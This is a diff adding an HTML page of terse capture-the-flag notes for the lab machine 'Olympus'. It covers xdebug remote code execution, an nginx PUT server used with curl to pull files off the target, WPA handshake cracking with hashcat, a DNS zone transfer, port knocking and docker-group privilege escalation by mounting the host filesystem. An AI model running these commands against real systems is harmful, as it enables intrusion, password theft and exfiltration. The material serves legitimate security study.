@@ -1,0 +1,84 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Olympus - DNS xdebug WPA Crack Docker Privesc</title>
+</head><body>Differences between dropping a packet, blocking a packet, etc. Know what is 'actually' happening when a port is 'filtered' in nmap<br/>
+<br/>
+53 dns on TCP usually suggests DNS zone transfer<br/>
+The dns script doesn't find anything<br/>
+<br/>
+xdebug in http headers<br/>
+Should only be listening on local host, but may be misconigured to allow it to respond to the outside<br/>
+<br/>
+Can use chrome or a new metasploit module to interact with xdebug<br/>
+Chrome has an xdebug extension/app<br/>
+xdebug over port 9000<br/>
+<br/>
+Send an xdebug session start request to the web server<br/>
+GET /?XDEBUG_SESSION_START=PleaseSubscribe<br/>
+<br/>
+And the xdebug app console should receive the request<br/>
+<br/>
+Adding code execution:<br/>
+Append to the HTML <br/>
+system("")<br/>
+<br/>
+Nginx file transfers, set up the server on the attacking machine<br/>
+mkdir /var/www/upload<br/>
+chown www-data /var/www/upload<br/>
+chmod 777 /var/www/upload<br/>
+<br/>
+/etc/nginx/sites-available/file-upload<br/>
+server {<br/>
+&nbsp; &nbsp; listen 8001 default_server;<br/>
+&nbsp; &nbsp; server_name ippsec.rocks;<br/>
+&nbsp; &nbsp; location / {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; root /var/www/upload;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; dav_methods PUT;<br/>
+&nbsp; &nbsp; }<br/>
+}<br/>
+<br/>
+ln -s /etc/nginx/sites-available/file_upload /etc/nginx/sites-enabled/<br/>
+systemctl restart nginx<br/>
+<br/>
+and upload with curl:<br/>
+curl --upload-file &lt;file&gt; server:port<br/>
+<br/>
+<br/>
+<br/>
+Cracking WPA<br/>
+Known by the cipher suite: Group Cipher Suite: AES (CCM) in Wireshark <br/>
+and the RSN information<br/>
+<br/>
+Let's crack it with hashcat...<br/>
+Grab hashcat-utils from github<br/>
+make<br/>
+./cap2hccapx captured_file.cap crackme_wpa<br/>
+hashcat -m 2500 crackme_wpa rockyou.txt<br/>
+<br/>
+<br/>
+We get the password. <br/>
+We can have wireshark to decryption now!<br/>
+Wireshark &gt; Edit &gt; preferences &gt; Protocols &gt; IEEE 802.11 &gt; Add decryption key: wpa-pwd, and check box for enable decryption<br/>
+filter: tcp || udp<br/>
+<br/>
+Foundd a domain name: ctfolympus.htb<br/>
+Now to zone transfer<br/>
+dig axfr @10.10.10.3 ctfolympus.htb<br/>
+<br/>
+We see a portal to Hades with three 'ports' we can use for port knocking<br/>
+and a possible password as well<br/>
+<br/>
+nmap -Pn --scan-delay=1 --max-retries=0 -p 1,2,3 &lt;host&gt;<br/>
+<br/>
+and check for open ports <br/>
+nmap scans for ports too fast for knockd sometimes, so adding a scan delay or manually knock with something else (like nc) <br/>
+You can use the "-r" option in nmap to disable randomization of the port scan<br/>
+<br/>
+docker group privesc<br/>
+docker run -ti &lt;docker name&gt; &lt;command&gt;<br/>
+<br/>
+But for the main privesc...mount the volume into a docker container<br/>
+docker run -v /:/mnt/PleaseSubscribe -ti &lt;docker name&gt; &lt;command&gt;<br/>
+docker run -v /:/mnt/PleaseSubscribe -ti Olympia bash</body></html>
